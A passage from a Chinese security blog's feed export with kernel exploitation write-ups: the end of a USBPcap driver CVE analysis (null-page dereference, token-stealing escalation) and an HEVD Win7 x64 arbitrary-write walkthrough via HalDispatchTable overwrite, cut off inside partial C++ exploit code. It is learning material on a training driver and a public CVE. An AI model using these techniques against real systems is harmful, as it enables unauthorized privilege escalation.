class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>=&gt; 内核<code>kernel32.dll</code>的<code>DeviceIoControl</code>（通过<code>plt</code>）</p><pre><code class="hljs c"><span class="hljs-comment">// attributes: thunk</span><span class="hljs-function">BOOL __stdcall <span class="hljs-title">DeviceIoControl</span><span class="hljs-params">(...)</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">return</span> __imp__DeviceIoControl@<span class="hljs-number">32</span>(...);&#125;</code></pre><p>=&gt; 内核<code>kernelbase.dll</code>的<code>DeviceIoControl</code>，在该函数通过判断是否为<code>FILE_DEVICE_FILE_SYSTEM</code>而判断进<code>NtFsControlFile</code>还是<code>NtDeviceIoControlFile</code></p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FILE_DEVICE_FILE_SYSTEM         0x00000009</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FILE_DEVICE_UNKNOWN             0x00000022</span></code></pre><pre><code class="hljs c"><span class="hljs-function">BOOL __stdcall <span class="hljs-title">DeviceIoControl</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">        HANDLE hDevice,</span></span><span class="hljs-function"><span class="hljs-params">        DWORD dwIoControlCode,</span></span><span class="hljs-function"><span class="hljs-params">        LPVOID lpInBuffer,</span></span><span class="hljs-function"><span class="hljs-params">        DWORD nInBufferSize,</span></span><span class="hljs-function"><span class="hljs-params">        LPVOID lpOutBuffer,</span></span><span class="hljs-function"><span class="hljs-params">        DWORD nOutBufferSize,</span></span><span class="hljs-function"><span class="hljs-params">        LPDWORD lpBytesReturned,</span></span><span class="hljs-function"><span class="hljs-params">        LPOVERLAPPED lpOverlapped)</span></span><span class="hljs-function"></span>&#123;  HANDLE hEvent; <span class="hljs-comment">// eax</span>  <span class="hljs-keyword">int</span> v9; <span class="hljs-comment">// eax</span>  <span class="hljs-keyword">int</span> Status; <span class="hljs-comment">// eax</span>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_STATUS_BLOCK</span> <span class="hljs-title">IoStatusBlock</span>;</span> <span class="hljs-comment">// [esp+10h] [ebp-20h] BYREF</span>  CPPEH_RECORD ms_exc; <span class="hljs-comment">// [esp+18h] [ebp-18h]</span>  <span class="hljs-keyword">if</span> ( !lpOverlapped )  &#123;    <span class="hljs-keyword">if</span> ( (dwIoControlCode &amp; <span class="hljs-number">0xFFFF0000</span>) == <span class="hljs-number">0x90000</span> )      Status = NtFsControlFile(                 hDevice,                 <span class="hljs-number">0</span>,                 <span class="hljs-number">0</span>,                 <span class="hljs-number">0</span>,                 &amp;IoStatusBlock,                 dwIoControlCode,                 lpInBuffer,                 nInBufferSize,                 lpOutBuffer,                 nOutBufferSize);    <span class="hljs-keyword">else</span>      Status = NtDeviceIoControlFile(                 hDevice,                 <span class="hljs-number">0</span>,                 <span class="hljs-number">0</span>,                 <span class="hljs-number">0</span>,                 &amp;IoStatusBlock,                 dwIoControlCode,                 lpInBuffer,                 nInBufferSize,                 lpOutBuffer,                 nOutBufferSize);    <span class="hljs-keyword">if</span> ( Status == <span class="hljs-number">0x103</span> )    &#123;      Status = NtWaitForSingleObject(hDevice, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);      <span class="hljs-keyword">if</span> ( Status &lt; <span class="hljs-number">0</span> )      &#123;LABEL_15:        <span class="hljs-keyword">if</span> ( (Status &amp; <span class="hljs-number">0xC0000000</span>) != <span class="hljs-number">-1073741824</span> )          *lpBytesReturned = IoStatusBlock.Information;        BaseSetLastNTError(Status);        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;      &#125;      Status = IoStatusBlock.Status;    &#125;    <span class="hljs-keyword">if</span> ( Status &gt;= <span class="hljs-number">0</span> )    &#123;      *lpBytesReturned = IoStatusBlock.Information;      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    &#125;    <span class="hljs-keyword">goto</span> LABEL_15;  &#125;  ....  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>如果是<code>NtDeviceIoControlFile</code>的话</p><pre><code class="hljs excel">=&gt; 内核 ntdll.dll 的 ZwDeviceIoControlFile（<span class="hljs-built_in">call</span> KiFastSystemCall）=&gt; 内核 ntoskrnl.exe 的 NtDeviceIoControlFile =&gt; 内核 ntoskrnl.exe 的 IopXxxControlFile</code></pre><p>如果是<code>NtFsControlFile</code>的话</p><pre><code class="hljs excel">=&gt; 内核 ntdll.dll 的 ZwFsControlFile（<span class="hljs-built_in">call</span> KiFastSystemCall）=&gt; 内核 ntoskrnl.exe 的 NtFsControlFile=&gt; 内核 ntoskrnl.exe 的 IopXxxControlFile</code></pre><p><code>IopXxxControlFile</code>函数会对<code>IRP</code>进行封装和分发，在<code>IopXxxControlFile</code>函数中会调用<code>IopSynchronousServiceTail</code>，在<code>IopSynchronousServiceTail</code>中会调用<code>IofCallDriver</code></p><p>在<code>IofCallDriver</code>中，对于不同的<code>v5</code>调用之前驱动中设置好的<code>dispatch Handler</code></p><pre><code class="hljs c"><span class="hljs-function">NTSTATUS __fastcall <span class="hljs-title">IofCallDriver</span><span class="hljs-params">(PDEVICE_OBJECT DeviceObject, PIRP Irp)</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// eax</span>  <span class="hljs-keyword">unsigned</span> __int8 v5; <span class="hljs-comment">// cl</span>  <span class="hljs-keyword">char</span> v6; <span class="hljs-comment">// al</span>  <span class="hljs-keyword">void</span> *retaddr; <span class="hljs-comment">// [esp+Ch] [ebp+4h]</span>  <span class="hljs-keyword">if</span> ( pIofCallDriver )    <span class="hljs-keyword">return</span> pIofCallDriver(DeviceObject, Irp, retaddr);  <span class="hljs-keyword">if</span> ( --Irp-&gt;CurrentLocation &lt;= <span class="hljs-number">0</span> )    KeBugCheckEx(<span class="hljs-number">0x35</span>u, (ULONG_PTR)Irp, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);  v4 = Irp-&gt;Tail.Overlay.PacketType - <span class="hljs-number">36</span>;  Irp-&gt;Tail.Overlay.PacketType = v4;  v5 = *(_BYTE *)v4;  *(_DWORD *)(v4 + <span class="hljs-number">20</span>) = DeviceObject;  <span class="hljs-keyword">if</span> ( v5 == <span class="hljs-number">22</span> &amp;&amp; ((v6 = *(_BYTE *)(v4 + <span class="hljs-number">1</span>), v6 == <span class="hljs-number">2</span>) || v6 == <span class="hljs-number">3</span>) )    <span class="hljs-keyword">return</span> IopPoHandleIrp();  <span class="hljs-keyword">else</span>    <span class="hljs-keyword">return</span> DeviceObject-&gt;DriverObject-&gt;MajorFunction[v5](DeviceObject, Irp);&#125;</code></pre><p>其汇编为<code>call    dword ptr [eax+ecx*4+38h] : ecx = 0xd</code>，而<code>0xd</code>正是<code>IRP_MJ_FILE_SYSTEM_CONTROL</code></p><p>因此对于当前这个<code>POC</code>，其整个<code>DeviceIoControl</code>的流程为</p><pre><code class="hljs erlang-repl">UserMode!DeviceIoControl -&gt; ntoskrnl!ZwDeviceIoControl -&gt; kernel32!DeviceIoControlImplementation -&gt; kernel32!DeviceIoControl -&gt; kernelbase!DeviceIoControl -&gt; ntdll!ZwFsControlFile -&gt; ntoskrnl!NtDeviceIoControlFile -&gt; ntoskrnl!IopXxxControlFile -&gt; ntoskrnl!IopSynchronousServiceTail -&gt; ntoskrnl!IofCallDriver -&gt; USBPcap!IRP_MJ_FILE_SYSTEM_CONTROL_dispatch_handler</code></pre><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>最后这个<code>crash</code>位置是<code>83e57f7b 8b4608          mov     eax,dword ptr [esi+8]</code><br>而此时，<code>esi=0x0</code>，这个内存不存在，因此出错，而<code>win7</code>还可以对<code>0</code>地址进行分配内存，因此可以直接在<code>0</code>地方分配内存，则最后会<code>call [eax+ecx*4+38h]</code>，而此时，<code>ecx=0xd</code>，因此相当于<code>call [0x6c]</code></p><pre><code class="hljs x86asm">nt!IofCallDriver+<span class="hljs-number">0x57</span>:83e74f7b 8b4608          <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">esi</span>+<span class="hljs-number">8</span>]83e74f7e <span class="hljs-number">52</span>              <span class="hljs-keyword">push</span>    <span class="hljs-built_in">edx</span>83e74f7f 0fb6c9          <span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">cl</span>83e74f82 <span class="hljs-number">56</span>              <span class="hljs-keyword">push</span>    <span class="hljs-built_in">esi</span>83e74f83 ff548838        <span class="hljs-keyword">call</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">eax</span>+<span class="hljs-built_in">ecx</span>*<span class="hljs-number">4</span>+<span class="hljs-number">38h</span>]</code></pre><p>按照之前的<code>HEVD</code>写个<code>shellcode</code>，<code>steal token</code>就可以提权，最后注意能使流程正常返回即可</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>其实漏洞比较简单，就是在整个过程的环境搭建和调试磨了很长时间，然后熟悉了一下<code>DeviceIoControl</code>的整个调用链</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://www.anquanke.com/post/id/86203">https://www.anquanke.com/post/id/86203</a><br><a href="https://www.exploit-db.com/exploits/41542">https://www.exploit-db.com/exploits/41542</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows kernel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HEVD win7 x64 arbitrary write</title>
    <link href="/2022/06/29/HEVD%20win7%20x64%20arbitrary%20write/"/>
    <url>/2022/06/29/HEVD%20win7%20x64%20arbitrary%20write/</url>
    
    <content type="html"><![CDATA[<p>HEVD 中的任意地址写</p><pre><code class="hljs nsis">环境：虚拟机：<span class="hljs-literal">Win7</span> SP1 x64物理机：<span class="hljs-literal">Win10</span>debugger：windbg previewcompiler：vs2022</code></pre><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>见前一篇栈溢出</p><h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><p>其中<code>arbitrary write</code>为<code>0x22200b</code></p><pre><code class="hljs cpp"><span class="hljs-keyword">case</span> <span class="hljs-number">0x22200B</span>:    DbgPrintEx(<span class="hljs-number">0x4D</span>u, <span class="hljs-number">3u</span>, <span class="hljs-string">&quot;****** HEVD_IOCTL_ARBITRARY_WRITE ******\n&quot;</span>);    FakeObjectNonPagedPoolNxIoctlHandler = ArbitraryWriteIoctlHandler(Irp, CurrentStackLocation);    v7 = <span class="hljs-string">&quot;****** HEVD_IOCTL_ARBITRARY_WRITE ******\n&quot;</span>;    <span class="hljs-keyword">goto</span> LABEL_62;</code></pre><p>漏洞点十分简单，就是一个任意地址写的漏洞</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> __fastcall <span class="hljs-title">ArbitraryWriteIoctlHandler</span><span class="hljs-params">(_IRP *Irp, _IO_STACK_LOCATION *IrpSp)</span></span><span class="hljs-function"></span>&#123;  _NAMED_PIPE_CREATE_PARAMETERS *Parameters; <span class="hljs-comment">// rcx</span>  <span class="hljs-keyword">int</span> result; <span class="hljs-comment">// eax</span>  Parameters = IrpSp-&gt;Parameters.CreatePipe.Parameters;  result = <span class="hljs-number">0xC0000001</span>;  <span class="hljs-keyword">if</span> ( Parameters )    <span class="hljs-keyword">return</span> TriggerArbitraryWrite((_WRITE_WHAT_WHERE *)Parameters);  <span class="hljs-keyword">return</span> result;&#125;</code></pre><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">TriggerArbitraryWrite</span><span class="hljs-params">(_WRITE_WHAT_WHERE *UserWriteWhatWhere)</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">unsigned</span> __int64 *What; <span class="hljs-comment">// rbx</span>  <span class="hljs-keyword">unsigned</span> __int64 *Where; <span class="hljs-comment">// rdi</span>  ProbeForRead(UserWriteWhatWhere, <span class="hljs-number">0x10</span>ui64, <span class="hljs-number">1u</span>);  What = UserWriteWhatWhere-&gt;What;  Where = UserWriteWhatWhere-&gt;Where;  DbgPrintEx(<span class="hljs-number">0x4D</span>u, <span class="hljs-number">3u</span>, <span class="hljs-string">&quot;[+] UserWriteWhatWhere: 0x%p\n&quot;</span>, UserWriteWhatWhere);  DbgPrintEx(<span class="hljs-number">0x4D</span>u, <span class="hljs-number">3u</span>, <span class="hljs-string">&quot;[+] WRITE_WHAT_WHERE Size: 0x%X\n&quot;</span>, <span class="hljs-number">16</span>i64);  DbgPrintEx(<span class="hljs-number">0x4D</span>u, <span class="hljs-number">3u</span>, <span class="hljs-string">&quot;[+] UserWriteWhatWhere-&gt;What: 0x%p\n&quot;</span>, What);  DbgPrintEx(<span class="hljs-number">0x4D</span>u, <span class="hljs-number">3u</span>, <span class="hljs-string">&quot;[+] UserWriteWhatWhere-&gt;Where: 0x%p\n&quot;</span>, Where);  DbgPrintEx(<span class="hljs-number">0x4D</span>u, <span class="hljs-number">3u</span>, <span class="hljs-string">&quot;[+] Triggering Arbitrary Write\n&quot;</span>);  *Where = *What;  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>i64;&#125;</code></pre><p>输入<code>0x10</code>个字节，把<code>what</code>上的内容赋到<code>where</code>地址上</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>为了能最后提权，我们应该做什么</p><p>找个内核的地方写？<br>=&gt; 需要知道内核地址<br>=&gt; 通过 <code>NtQuerySystemInformation/ZwQuerySystemInformation</code> 接口获取内核的基地址<br>=&gt; 通过基地址+偏移获取在内核中的地址</p><p>写什么地方？<br>=&gt; 内核中的函数指针<br>=&gt; 那这个函数指针对应的接口应该有什么特征呢？<br>=&gt; 应该较少被内核调用，否则被其他地方调用了，就可能导致内核崩溃 &amp;&amp; 可以通过用户态的一个接口进行调用，从而触发对函数指针的调用<br>=&gt; 找到<code>HalDispatchTable</code>中偏移为<code>0x8</code>位置的<code>xHalSetSystemInformation</code>函数指针接口完美符合，上层可由<code>NtQueryIntervalProfile</code>或<code>NtSetIntervalProfile</code>调用</p><p>（P.S. 这里的思路可参考这个<a href="https://shinnai.altervista.org/papers_videos/ECFID.pdf">ECFID.pdf</a> ）</p><p>整个流程类似下图，在用户空间写的进程，先通过任意地址写漏洞修改了<code>HalDispatchTable</code>，然后通过用户态的接口调用<code>NtQueryIntervalProfile</code>，从而使用了<code>xHalQuerySysttemInformation</code>这个函数指针，最后跳转到<code>shellcode</code>上</p><p><img src="/image/HEVD%20win7%20x64%20arbitrary%20write/QQ%E6%88%AA%E5%9B%BE20220628204429.png" alt="流程图"></p><p>这里说明一下<code>Nt* | ZW*</code>区别</p><ol><li>在<code>ntdll.dll</code>中，<code>Nt*</code>和<code>Zw*</code>应该是没区别，这个是跑在<code>ring3</code>的</li><li>在<code>ntoskrnl</code>中，<code>Nt*</code>和<code>Zw*</code>都是跑在<code>ring0</code>。<code>Nt*</code>是该接口的具体实现，绕过了<code>SSDT</code>，而<code>Zw*</code>是通过<code>SSDT</code>的<code>KiSystemService</code>调用<code>ntoskrnl</code>中的<code>Nt*</code>函数（我通过<code>uf</code>看的汇编的流程是，<code>nt!Zw*</code>-&gt;<code>nt!KiServiceInternal</code>-&gt;<code>nt!KiSystemServiceStart</code>）</li></ol><p>这部分的区别参考以下博客<a href="https://blog.csdn.net/SysProgram/article/details/5805265">1</a>，<a href="https://blog.csdn.net/shenjianxz/article/details/52704046">2</a>，<a href="https://blog.csdn.net/evi10r/article/details/6742052">3</a>，<a href="https://codeantenna.com/a/fsxdbtaiWL">4</a>，<a href="https://blog.csdn.net/SysProgram/article/details/5805265">5</a></p><p>关于<code>SSDT</code>的说明，有<a href="https://bbs.pediy.com/thread-177772.htm">1</a>，<a href="https://bbs.pediy.com/thread-84946-1.htm">2</a>，<a href="https://www.anquanke.com/post/id/262577">3</a></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>整个流程应该为</p><ol><li><code>GetKernelBaseSystemModule</code>：通过<code>NtQuerySystemInformation/ZwQuerySystemInformation</code>接口获取<code>SYSTEM_MODULE</code>，从而获取内核的基址</li><li><code>GetHalDispatchTableAddress</code>：通过基址找到<code>HalDispatchTable</code>在内核中的地址，从而找到<code>xHalSetSystemInformation</code>这一函数指针的地址，即<code>Where</code></li><li><code>Perpare</code>：准备<code>shellcode</code>，以及与驱动进行交互，进行任意地址写</li><li><code>TriggerShellcode</code>：通过用户态的<code>ntdll</code>的<code>NtQueryIntervalProfile</code>接口执行<code>shellcode</code>并正常返回</li><li><code>start cmd</code>：起一个提权的<code>cmd</code></li></ol><h3 id="GetKernelBaseSystemModule"><a href="#GetKernelBaseSystemModule" class="headerlink" title="GetKernelBaseSystemModule"></a>GetKernelBaseSystemModule</h3><p>第一次调用<code>ntdll.ZwQuerySystemInformation(0xb, NULL, 0, &amp;len)</code>可以得到一个<code>error</code>的结果，但是会在<code>len</code>上返回一个该查询会得到的结构体大小（P.S. 第一次<code>len</code>指向<code>0</code>）</p><p>第二次调用<code>ntdll.ZwQuerySystemInformation</code>，把正确的大小（<code>len</code>）和空间（<code>PModuleInfo</code>）输入进去，即可得到<code>SYSTEM_MODULE</code>的信息，<code>ntdll.ZwQuerySystemInformation(0xb, PModuleInfo, len, &amp;len)</code></p><p>在<code>PModuleInfo</code>这个结构体是由<code>ULONG ModulesCount</code>和<code>SYSTEM_MODULE Modules[ModulesCount]</code>数组组成的，前一项表示存在多少项<code>SYSTEM_MODULE</code>，之后就是每个<code>SYSTEM_MODULE</code>的详细信息</p><p>在这里可以通过<code>module.Name</code>是否为<code>ntoskrnl</code>从而得到<code>ImageBaseAddress</code>（P.S. 但是从<a href="https://www.anquanke.com/post/id/246289">Gcow exp</a>和我自己写完<code>exp</code>跑完的结果来看，这个<code>ntoskrnl.exe</code>一直是第一项）</p><p>这个地方的获取基址，这篇 <a href="https://macchiato.ink/hst/bypassav/Windows_Kernel_GetFunction/">Windows取内核中的函数</a> 讲得特别清楚</p><p>（P.S. 我在这里踩了一个坑，就是<code>struct SYSTEM_MODULE</code>，里面写每个属性时，没把<code>ULONG</code>写成带数字的，当时我查了一下<code>ULONG</code>默认是<code>8</code>字节，结果最后打印项的时候发现不对）</p><h3 id="GetHalDispatchTableAddress"><a href="#GetHalDispatchTableAddress" class="headerlink" title="GetHalDispatchTableAddress"></a>GetHalDispatchTableAddress</h3><p>通过得到的<code>SYSTEM_MODULE</code>，经过<code>userland_HalDispatchTable - uerland_base + kernel_base</code>就可以得到<code>HalDispatchTable</code>在内核中的地址了</p><h3 id="TriggerShellcode"><a href="#TriggerShellcode" class="headerlink" title="TriggerShellcode"></a>TriggerShellcode</h3><p>因为是通过上层<code>ntdll</code>的<code>api</code>去调用底层的<code>xHalSetSystemInformation</code>地址上的函数指针，就需要查看这个调用链上的情况</p><p>在<code>ntoskrnl.exe</code>中可以利用<code>windbg</code>下载的<code>.pdb</code>得到符号，从而直接找到<code>NtQueryIntervalProfile</code>的地址</p><pre><code class="hljs cpp"><span class="hljs-function">NTSTATUS __stdcall <span class="hljs-title">NtQueryIntervalProfile</span><span class="hljs-params">(KPROFILE_SOURCE ProfileSource, PULONG Interval)</span></span><span class="hljs-function"></span>&#123;  PULONG v2; <span class="hljs-comment">// rbx</span>  v2 = Interval;  <span class="hljs-keyword">if</span> ( KeGetCurrentThread()-&gt;PreviousMode )  &#123;    <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> __int64)Interval &gt;= MmUserProbeAddress )      Interval = (PULONG)MmUserProbeAddress;    *Interval = *Interval;  &#125;  *v2 = KeQueryIntervalProfile(ProfileSource);  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>可以看到第一个函数的接口部分，没什么需要设置的（P.S. 我就使<code>Interval</code>是个可读写的地址）</p><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">KeQueryIntervalProfile</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a1)</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">int</span> v2; <span class="hljs-comment">// [rsp+20h] [rbp-18h] BYREF</span>  <span class="hljs-keyword">char</span> v3; <span class="hljs-comment">// [rsp+24h] [rbp-14h]</span>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// [rsp+28h] [rbp-10h]</span>  <span class="hljs-keyword">char</span> v5; <span class="hljs-comment">// [rsp+40h] [rbp+8h] BYREF</span>  <span class="hljs-keyword">if</span> ( !a1 )    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)KiProfileInterval;  <span class="hljs-keyword">if</span> ( a1 == <span class="hljs-number">1</span> )    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)KiProfileAlignmentFixupInterval;  v2 = a1;  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">int</span>)((__int64 (__fastcall *)(__int64, __int64, <span class="hljs-keyword">int</span> *, <span class="hljs-keyword">char</span> *))off_1401E2CF8)(<span class="hljs-number">1</span>i64, <span class="hljs-number">12</span>i64, &amp;v2, &amp;v5) &gt;= <span class="hljs-number">0</span> &amp;&amp; v3 )    <span class="hljs-keyword">return</span> v4;  <span class="hljs-keyword">else</span>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>i64;&#125;</code></pre><p>第二个函数，需要传进来的<code>ProfileSource</code>不能为<code>0</code>和<code>1</code>，因此我设置为<code>2</code></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>最终版</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">SYSTEM_MODULE</span> &#123;</span>    ULONG64 Reserved1;    ULONG64 Reserved2;    ULONG64 ImageBaseAddress;    ULONG32 ImageSize;    ULONG32 Flags;    USHORT Id;    USHORT Rank;    USHORT LoadCount;    USHORT NameOffset;    CHAR Name[<span class="hljs-number">256</span>];&#125; SYSTEM_MODULE, * PSYSTEM_MODULE;<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">SYSTEM_MODULE_INFORMATION</span> &#123;</span>    ULONG ModulesCount;    SYSTEM_MODULE Modules[<span class="hljs-number">1</span>];&#125; SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;<span class="hljs-keyword">typedef</span> <span class="hljs-keyword">enum</span> _SYSTEM_INFORMATION_CLASS &#123;    SystemModuleInformation = <span class="hljs-number">0xB</span>&#125; SYSTEM_INFORMATION_CLASS;<span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(WINAPI* PZwQuerySystemInformation)</span></span><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">    __in SYSTEM_INFORMATION_CLASS SystemInformationClass,</span></span><span class="hljs-function"><span class="hljs-params">    __inout PVOID SystemInformation,</span></span><span class="hljs-function"><span class="hljs-params">    __in ULONG SystemInformationLength,</span></span><span class="hljs-function"><span class="hljs-params">    __out_opt PULONG ReturnLength</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;<span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(WINAPI* PNtQueryIntervalProfile)</span></span><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">    __in INT32 ProfileSource,</span></span><span class="hljs-function"><span class="hljs-params">    __in PULONG * Interval</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;<span class="hljs-function">SYSTEM_MODULE <span class="hljs-title">GetKernelBaseSystemModule</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-comment">// Using NtQuerySystemInformation/ZwQuerySystemInformation Interface to get kernel image base</span>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">sizeof</span>(SYSTEM_MODULE) != <span class="hljs-number">0x128</span>)    &#123;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] struct SYSTEM_MODULE Error&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        system(<span class="hljs-string">&quot;pause&quot;</span>);        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);    &#125;    <span class="hljs-comment">// Load ntdll.dll</span>    HMODULE hNtdll = LoadLibraryA(<span class="hljs-string">&quot;ntdll&quot;</span>);    <span class="hljs-keyword">if</span> (hNtdll == <span class="hljs-literal">NULL</span>)    &#123;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] Load Ntdll Failed&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        system(<span class="hljs-string">&quot;pause&quot;</span>);        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);    &#125;    <span class="hljs-comment">// [*] Get NtQuerySystemInformation/ZwQuerySystemInformation address</span>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[*] Get ZwQuerySystemInformation Address&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;    PZwQuerySystemInformation ZwQuerySystemInformation = (PZwQuerySystemInformation)GetProcAddress(hNtdll, <span class="hljs-string">&quot;ZwQuerySystemInformation&quot;</span>);    <span class="hljs-keyword">if</span> (!ZwQuerySystemInformation)    &#123;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] Failed to Get the Address of NtQuerySystemInformation&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] Last Error: &quot;</span> &lt;&lt; GetLastError() &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        system(<span class="hljs-string">&quot;pause&quot;</span>);        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);    &#125;    <span class="hljs-comment">// [*] Get Buffer Length</span>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[*] Get Buffer Length&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;    ULONG len = <span class="hljs-number">0</span>;    <span class="hljs-comment">// the API Call ends in an error, but we can get the correct Length in ReturnLength </span>    ZwQuerySystemInformation(SystemModuleInformation, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, &amp;len);    <span class="hljs-comment">// Allocate Memory</span>    PSYSTEM_MODULE_INFORMATION PModuleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(<span class="hljs-literal">NULL</span>, len, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);    <span class="hljs-comment">// Get SYSTEM_MODULE_INFORMATION</span>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[*] Get SYSTEM_MODULE_INFORMATION&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;    NTSTATUS Status = ZwQuerySystemInformation(SystemModuleInformation, PModuleInfo, len, &amp;len);    <span class="hljs-keyword">switch</span> (Status)    &#123;    <span class="hljs-keyword">case</span> (NTSTATUS)<span class="hljs-number">0x0</span>:        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[*] NtQuerySystemInformation Sucess&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-keyword">break</span>;    <span class="hljs-keyword">case</span> (NTSTATUS)<span class="hljs-number">0xC0000004</span>:        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] NtQuerySystemInformation Failed, NTSTATUS: STATUS_INFO_LENGTH_MISMATCH (0xC0000004)&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        system(<span class="hljs-string">&quot;pause&quot;</span>);        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);    <span class="hljs-keyword">case</span> (NTSTATUS)<span class="hljs-number">0xC0000005</span>:        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] NtQuerySystemInformation Failed, NTSTATUS: STATUS_ACCESS_VIOLATION (0xC0000005)&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        system(<span 